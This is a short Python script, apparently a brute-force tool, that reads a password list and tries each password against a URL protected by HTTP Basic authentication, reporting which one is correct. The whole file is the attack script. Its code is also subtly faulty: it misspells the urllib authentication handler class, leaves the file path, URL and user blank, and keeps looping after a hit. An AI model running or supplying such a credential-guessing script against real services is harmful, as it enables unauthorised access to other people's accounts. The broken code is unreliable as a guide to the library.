import urllib.request

def attack_basic(url,user_id):
    f = open("", "r")
    passlist=f.read().splitlines()
    for password in passlist:
        try:
            pass_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm()
            pass_mgr.add_password(realm=None, uri=url,user=user_id,passwd=password)
            handler = urllib.request.HTTPbasicAuthHandler(pass_mgr)
            opener = urllib.request.build_opener(handler)
            urllib.request.install_opener(opener)
            urllib.request.urlopen(url)
            print("%s is correct!" % password)
        except urllib.request.HTTPError as err:
            print("%s is incorrect" % password)


if __name__ == '__main__':
    url = ""
    user_id = ""
    attack_basic(url,user_id)
